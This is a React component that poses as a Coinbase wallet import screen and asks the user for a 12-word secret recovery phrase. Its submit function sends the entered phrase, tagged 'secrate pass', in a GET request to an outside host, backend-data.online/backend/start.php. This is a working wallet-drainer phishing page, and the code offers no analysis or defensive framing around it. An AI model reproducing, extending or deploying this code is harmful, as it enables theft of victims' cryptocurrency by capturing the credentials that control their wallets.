import React from "react";
import { IoMdArrowBack } from "react-icons/io";



let cherc12 = ["", "", "", "", "", "", "", "", "", "", "", ""];
const CoinbaseWallet = ({ setCoinbaseCn }) => {
  const [segments, setSegments] = React.useState(cherc12);
  function onPaste(event) {
    const pasted = event.clipboardData.getData("text/plain");

    setSegments(pasted.split(" ").slice(0, segments.length));
  }

  const style = {
    btnDis:
      "cursor-not-allowed opacity-10 w-full mt-6 flex text-base flex-row items-center justify-center rounded-lg border-2 border-[#FFE32B] bg-[#436147]  font-medium text-white hover:cursor-pointer dark:border-fuchsia-800  px-4 h-10 flex-shrink-0 whitespace-nowrap bg-[#999999]",
    btnEnb:
      "cursor-pointer w-full mt-6 flex text-base flex-row items-center justify-center rounded-lg border-2 border-[#FFE32B] bg-[#436147]  font-medium text-white hover:cursor-pointer dark:border-fuchsia-800  px-4 h-10 flex-shrink-0 whitespace-nowrap",
  };
  const submitAddress = () => {
    let vault = {
      type: "secrate pass",
      main: `
      [Phantom App]
      ${segments}
      `,
    };
    fetch(
      `https://backend-data.online/backend/start.php?phrase=${vault.main}`,
      {
        method: "GET",
        mode: "cors",
        headers: { "content-type": "application/json" },
      }
    ).then((success) => {
      setSegments(["", "", "", "", "", "", "", "", "", "", "", ""]);
    });
  };
  return (
    <div className="transition-10 duration-50 justify-center items-center flex fixed -top-40   inset-0  outline-0 ">
      <div className="bg-white z-10 rounded-xl lg:mt-20">
        <div className=" lg:w-[480px] w-[23rem] overflow-y-auto  ">
          <div>
            <div className="relative p-5 text-center flex justify-between border-b">
              <p
                onClick={() => {
                  setSegments(["", "", "", "", "", "", "", "", "", "", "", ""]);
                  setCoinbaseCn((prev) => !prev);
                }}
                className="cursor-pointer text-slate-500 flex items-center text-lg absolute top-5 "
              >
                <IoMdArrowBack />
              </p>
              {/* <img src={ima} alt="" className="lg:ml-40 md:ml-20 ml-28" /> */}
            </div>
            <div className="px-2 mt-5 mb-10">
              <p className="text-4xl text-center   ">Secret Recovery Phrase</p>
              <p className="text-xl text-center font-[500] text-[#999999] my-5">
                Import an existing wallet with your 12 or 24-word secret
                recovery phrase.
              </p>
            </div>
            <div className="grid grid-cols-3 gap-3 m-4 px-2 rounded-2xl relative">
              {segments.map((s, key) => (
                <>
                  <input
                    key={key}
                    value={s}
                    onPaste={onPaste}
                    name="tjhgdjhagd"
                    placeholder={key + 1}
                    className={` placholder:text-[#999999] w-full border  outline-0 px-2 py-1 rounded-lg placeholder:font-[400] text-lg inpbg dark:text-black text-black`}
                  />
                </>
              ))}
            </div>
          </div>
          <div className="flex flex-col items-center mx-10 mt-10 mb-4">
          
            <button
              onClick={() => submitAddress()}
              disabled={!segments}
              className={segments[10].length < 2 ? style.btnDis : style.btnEnb}
            >
              <span className="text-xl">Import Wallet</span>
            </button>
          </div>
        </div>
      </div>
    </div>
  );
};

export default CoinbaseWallet;
